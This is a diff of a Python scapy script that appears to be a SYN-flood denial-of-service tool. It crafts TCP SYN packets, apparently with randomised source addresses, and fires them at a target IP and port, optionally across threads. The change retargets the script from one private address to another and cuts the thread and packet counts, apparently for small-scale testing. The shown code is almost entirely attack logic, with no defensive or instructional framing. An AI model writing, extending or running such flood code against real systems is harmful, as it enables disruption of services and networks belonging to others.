@@ -5,10 +5,10 @@ import time
 from scapy.layers.inet import IP, TCP
 from scapy.sendrecv import send
 
-TARGET = "192.168.100.1"
+TARGET = "192.168.100.20"
 DST_PORT = 8080
-THREAD_COUNT = 10
-PACKETS_PER_THREAD = 100
+THREAD_COUNT = 1
+PACKETS_PER_THREAD = 2
 
 
 def ran_ip():
@@ -28,19 +28,20 @@ def floor():
         tcp = TCP(sport=src_port, dport=DST_PORT, flags='S', seq=seq)
         packet = ip / tcp
 
-        send(packet, timeout=2, verbose=0)
+        send(packet, verbose=0)
 
         print(f"[+] Packet with number {i} send.")
 
 def threaded_dos():
     threads = []
-    for _ in range(THREAD_COUNT):
-        t = threading.Thread(target=floor)
-        t.start()
-        threads.append(t)
-
-    for t in threads:
-        t.join()
+    floor()
+    # for _ in range(THREAD_COUNT):
+    #     t = threading.Thread(target=floor)
+    #     t.start()
+    #     threads.append(t)
+    #
+    # for t in threads:
+    #     t.join()
 
 
 if __name__ == '__main__':
